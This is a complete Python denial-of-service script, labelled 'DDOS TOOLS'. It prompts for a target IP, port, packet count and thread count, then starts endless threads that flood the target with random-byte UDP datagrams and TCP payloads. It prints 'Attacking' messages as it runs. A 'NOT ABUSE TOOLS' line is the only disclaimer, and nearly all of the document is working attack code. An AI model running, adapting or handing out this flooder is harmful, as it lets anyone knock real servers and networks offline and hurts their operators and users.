import random
import socket
import threading
import time
import os,sys

os.system('clear')
print("\033[1;31;40m")
print("""
╔════════════════════════╗
║                     DDOS TOOLS                                         ║
╚════════════════════════╝
""")
print("NOT ABUSE TOOLS")
time.sleep(2)

ip = str(input("\033[1;36;40mIP : \033[1;31;40m"))
port = int(input("\033[1;36;40mPORT : \033[1;31;40m"))
choice = str(input("\033[1;36;40mMETHODS : \033[1;31;40m"))
times = int(input("\033[1;36;40mPACKETS : \033[1;31;40m"))
threads = int(input("\033[1;36;40mTHREADS : \033[1;31;40m"))

os.system("clear")
def run():
	data = random._urandom(1490)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("\033[1;36;40mAsepp Attacking IP : %s AND PORT :  %s"%(ip,port))
		except:
			print("DDoS Done")


def run2():
	data = random._urandom(2015)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\033[1;36;40mAsepp Attacking IP : %s AND PORT :  %s"%(ip,port))
		except:
			s.close()
			print("DDoS Done")

for y in range(threads):
    if choice == 'KILL':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
